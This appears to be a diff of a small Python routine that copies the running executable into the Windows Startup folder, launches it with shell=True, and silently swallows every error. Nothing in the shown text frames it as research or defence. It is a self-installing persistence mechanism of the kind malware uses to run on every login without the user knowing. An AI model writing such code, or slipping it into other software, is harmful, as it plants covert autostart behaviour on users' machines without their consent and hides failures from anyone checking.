@@ -9,13 +9,13 @@ import shutil
 
 try:
     startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-    exe_path = sys.argv[0]
+    exe_path = sys.executable
     exe_name = os.path.basename(exe_path)
     destination = os.path.join(startup_folder, exe_name)
 
     if not os.path.exists(destination):
         shutil.copyfile(exe_path, destination)
-        subprocess.Popen(["python", destination])
+        subprocess.Popen(destination, shell=True)
 except:
     pass
 
